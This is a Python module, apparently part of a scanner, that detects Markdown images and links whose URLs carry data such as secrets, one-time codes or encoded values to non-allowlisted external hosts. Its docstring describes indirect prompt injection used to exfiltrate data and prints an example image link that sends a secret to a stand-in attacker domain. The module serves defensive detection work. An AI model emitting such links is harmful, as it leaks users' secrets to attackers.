"""Markdown images and links that carry data to an external server.

A classic indirect-injection exfiltration path: the attacker makes the model
render ``![x](https://evil.example/log?d=<secret>)`` and the client fetches it.
"""

from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlsplit

from ..detector import BOTH, Detector, register
from ..finding import Finding, Severity

_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)>?[^)]*\)")
_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)>?[^)]*\)")
_TEMPLATE = re.compile(r"\{[^}]*\}|%7b|\$\(")
# Short values still leak: a 6-digit OTP, a PIN, or a secret exfiltrated a few characters at a time.
_DIGIT_RUN = re.compile(r"\d{5,}")
_ENCODED = re.compile(r"^(?:[A-Za-z0-9+/_-]{8,}={0,2}|[0-9a-fA-F]{8,}|(?:%[0-9a-fA-F]{2}){3,}.*)$")


def _host_allowed(host: str, allowed: tuple[str, ...]) -> bool:
    host = host.lower()
    return any(host == d or host.endswith("." + d) for d in allowed)


def _looks_like_payload(value: str) -> bool:
    """A short query value that is still plainly data: digits, base64/hex or percent-encoding."""
    if _DIGIT_RUN.search(value):
        return True
    if not _ENCODED.match(value):
        return False
    # Plain words ("thumbnail", "dark-mode") match the base64 alphabet; real encodings mix classes.
    classes = sum(bool(re.search(rx, value)) for rx in (r"[a-z]", r"[A-Z]", r"\d", r"[+/=%_-]"))
    return classes >= 3 or bool(re.fullmatch(r"[0-9a-fA-F]{8,}", value) and re.search(r"\d", value))


def _carries_data(url: str, min_length: int) -> bool:
    parts = urlsplit(url)
    if _TEMPLATE.search(url.lower()):
        return True
    values = [v for _, v in parse_qsl(parts.query, keep_blank_values=True)]
    if any(len(v) >= min_length or _looks_like_payload(v) for v in values):
        return True
    segments = [s for s in parts.path.split("/") if s]
    return any(len(s) >= min_length * 2 for s in segments)


@register
class MarkdownExfil(Detector):
    name = "markdown_exfil"
    kind = BOTH
    description = "Markdown images or links whose URL carries data to a non-allowlisted host."

    def __init__(self, allowed_domains: tuple[str, ...] | list[str] = (), min_value_length: int = 16, **options) -> None:
        super().__init__(**options)
        self.allowed_domains = tuple(d.lower().lstrip(".") for d in allowed_domains)
        self.min_value_length = min_value_length

    def scan(self, text: str, normalized: str) -> list[Finding]:
        findings = []
        for regex, severity, label in (
            (_IMAGE, Severity.HIGH, "image"),
            (_LINK, Severity.MEDIUM, "link"),
        ):
            for match in regex.finditer(text):
                url = match.group(1)
                host = urlsplit(url).hostname or ""
                if _host_allowed(host, self.allowed_domains):
                    continue
                if _carries_data(url, self.min_value_length):
                    findings.append(
                        Finding(self.name, severity, f"Markdown {label} sends data to external host {host}", url[:120])
                    )
        return findings
